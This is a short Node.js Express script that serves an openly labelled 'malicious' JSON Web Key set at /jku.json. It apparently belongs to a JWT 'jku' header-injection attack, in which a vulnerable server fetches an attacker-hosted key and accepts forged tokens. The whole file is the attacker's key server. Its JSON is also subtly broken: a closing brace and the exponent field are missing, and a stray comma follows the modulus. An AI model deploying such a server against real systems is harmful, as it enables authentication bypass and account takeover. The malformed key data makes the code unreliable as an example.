const express = require('express');
const app = express();
const port = 3000;

// Malicious JWK JSON
const maliciousJWK = {
    "keys": [
        {
            "kty": "RSA",
            "kid": "be016f78-e993-4fc3-b2ad-c805e0593dc6",  // Use the same 'kid' as in the JWT header
            "use": "sig",
            "alg": "RS256",
            "n": "QzJCRTg3RUM0QTVCMzIwQ0FDRjBEQUFBRkZGRTVBRDFFRjk5MUM3QTMxQjE5MDBCMjJGQkFENENEMzk5NDcwNTI3MzJCMTU5RUQxNEYzQTc0QTU3NDQzRjk2OTYzNDc0QzQ2MjcxNkIwMUY4ODZFOTBEMUQ2NjcwMDc5NEM5N0NCMDlDNTE2N0RCMDlFRjIwNTA5RTg4OUVCRkU2MDRGRkVGOTQ5M0M0NDdCN0ZGNDNEQ0Y1QTFFOTQ2RUVGQzlCMjE5QzI2QjAzMUZGREVEM0RGRjkwNkQ2NkIzRkNBQUQ1QjNFNTUwQUNFMTNCQjMzMDA4MzcyODJBMjcxQzYxN0E4MUQyMURFNDI0NjNGODY4NzFCQjVEQkQzRkM1QjhDQ0M1MUE4QjlEQkUyMTk5NjVEMDI5MjYxMzM4RDE5NkNGNDM1M0YxQjM1ODMyMjk4N0VCMjk3OThFMDMyNEM3RUExQUY2ODE3NDFERDI2MkM4NThEMTc1QzY0NTlDMjEzRkY1QUM0MDFBNjc5NTI5NjhGNjRCMkZGNEQzNjY2RDAzRTJDRUU0NzNEOTA4NEQ3NDI5MEE4MDA4RTA2RDYxMjY2OTQxMjM0Qzg5QkY4RkRCRDI1QUYxNDAyNTU1REEwMEY4NjQ2RUY0ODQ1QTM0RkM2RDgyNDBDRDY1MkYwRTU=", 
    ]
};

// Endpoint to serve the JWK
app.get('/jku.json', (req, res) => {
    res.json(maliciousJWK);
});

app.listen(port, () => {
    console.log(`Malicious JWK server listening at http://localhost:${port}`);
});
